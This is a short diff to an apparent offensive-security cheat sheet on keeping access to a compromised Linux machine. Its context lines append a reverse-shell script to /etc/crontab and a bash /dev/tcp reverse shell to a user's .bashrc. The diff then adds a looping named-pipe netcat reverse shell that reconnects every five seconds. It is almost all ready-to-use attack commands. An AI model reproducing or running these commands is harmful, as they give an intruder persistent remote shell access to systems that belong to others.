@@ -48,3 +48,8 @@ echo "* * * * * root /path/to/reverse_shell.sh >> /etc/crontab
 echo 'bash -i >& /dev/tcp/<your ip>/4444 0>&1' >> ~/.bashrc
 ```
 every time user logs in, reverse_shell gets executed
+
+---
+Reverse Shell Bash Loop
+
+while true; do sleep 5 && mknod /dev/shm/p p; cat /dev/shm/p | /bin/bash -i | nc 127.0.0.1 9001 >/dev/shm/p; done
